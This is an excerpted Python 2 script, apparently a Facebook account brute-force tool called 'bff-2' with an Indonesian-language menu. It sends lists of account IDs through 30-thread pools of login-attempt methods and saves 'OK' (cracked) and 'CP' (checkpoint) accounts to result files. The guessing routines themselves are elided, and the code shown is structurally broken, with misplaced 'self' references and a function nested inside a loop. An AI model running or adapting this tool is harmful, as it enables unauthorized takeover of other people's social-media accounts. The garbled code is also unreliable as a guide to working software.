...
"""%s
 ...
 - author      : Galatia Lumbantoruan
 - teks    : Sorry Nih Sc Recode
 - fanspage    : -
 - whatsap     : -
 - github      : -
 - script name : bff-2
...
def banner():
 ...
 © Group%s
 ________________
|________________|  %s> %sZona
| Drak Facebook %s> %sAkun 
| ________________%s>%s Facebook
|________________|  %s>%s Indonesia
         \/    \/ 
 %s[%s*%s] By : %sGalatia Lumbantoruan
 %s[%s*%s] --------------------------------------
 [%s*%s] IP : %s%s
...
def menu():
    ...
    if unik == '':
        ...
        print("%s [!] Isi yang benar bang jago "%(M));jeda(2);menu()
        ...
        if unikers in ('Y', 'y'):
            ...
            while True:
                ...
                if pwx == '':
                    ...
                    def zona(galatia_=None): 
                        ind = raw_input('\n %s[?] methode : %s'%(P,K))
                        if ind == '':
                            print("%s [!] Isi yang benar bang jago "%(M));self.zona()
                        elif ind in ('1', '01'):
                            ...
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, galat_)
                                    except: pass
                            ...
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.basic, indo, galatia_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('3', '03'):
                            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            ...
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobil, indo, galatia_)
                                    except: pass
                            os.remove(self.apk);exit()
                        else:
                            print ('\n %s[!] isi yang benar bang jago'%(M));zona()
            ...
            print("%s [!] Isi yang benar bang "%(M));jeda(2);menu()
    def langsung(self):
        suuu = raw_input('\n %s[?] methode :%s '%(P,K))
        if suuu == '':
            print("%s [!] Isi yang benar Bang "%(M));self.langsung()
        elif suuu in ('1', '01'):
            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            ...
            print("\n%s [!] Isi yang benar bang "%(M));self.langsung()
...
def uas():
    u = raw_input('\n%s [?] pilih :%s '%(P,K))
    if u == '':
        print("%s [!] Isi yang benar bang jago"%(M));jeda(2);uas()
    elif u in("1","01"):
